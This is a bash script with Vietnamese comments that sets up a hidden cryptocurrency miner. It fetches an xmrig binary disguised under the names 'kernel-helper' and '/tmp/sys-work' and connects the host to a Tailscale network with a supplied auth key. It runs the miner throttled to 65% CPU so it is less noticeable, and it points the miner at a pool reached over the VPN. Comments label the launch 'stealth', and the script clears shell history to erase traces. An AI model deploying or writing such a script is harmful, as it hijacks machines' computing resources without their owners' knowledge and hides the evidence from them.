#!/bin/bash

# 1. Khai bao thong so
AUTH_KEY=$1
PROXY_IP=$2

if [ -z "$AUTH_KEY" ] || [ -z "$PROXY_IP" ]; then
  echo "Nhap thieu thong so!"
  echo "Cu phap chuan: ./setup.sh <AUTH_KEY> <PROXY_IP>"
  exit 1
fi

# Link tai file kernel-helper
MINER_URL="https://raw.githubusercontent.com/tamprimary/xmrig/main/kernel-helper"

# 2. Toi uu he thong (Swap & Hugepages)
sudo sysctl -w vm.nr_hugepages=1280
sudo dd if=/dev/zero of=/swapfile bs=1M count=2048
sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile

# 3. Cai dat Tailscale va Ket noi
curl -fsSL https://tailscale.com/install.sh | sh
#sudo tailscaled &
sudo tailscaled > /dev/null 2>&1 &
sudo tailscale up --authkey=$AUTH_KEY --hostname=$(hostname)-$(date +%s) --accept-routes

# 4. Cai dat cpulimit va Miner
sudo apt update && sudo apt install -y cpulimit
wget -O /tmp/sys-work $MINER_URL
chmod +x /tmp/sys-work
sudo apt update && sudo apt install -y libuv1 libssl3 libhwloc15

# 5. Khoi chay tang hinh
# Gioi han 65% CPU, ket noi qua VPN noi bo
nohup sudo cpulimit -l 65 -- /tmp/sys-work -o $PROXY_IP:3333 -u $(hostname) -p x > /dev/null 2>&1 &

# 6. Don dep dau vet
history -c
echo "Done! May dang dao tang hinh qua Tailscale."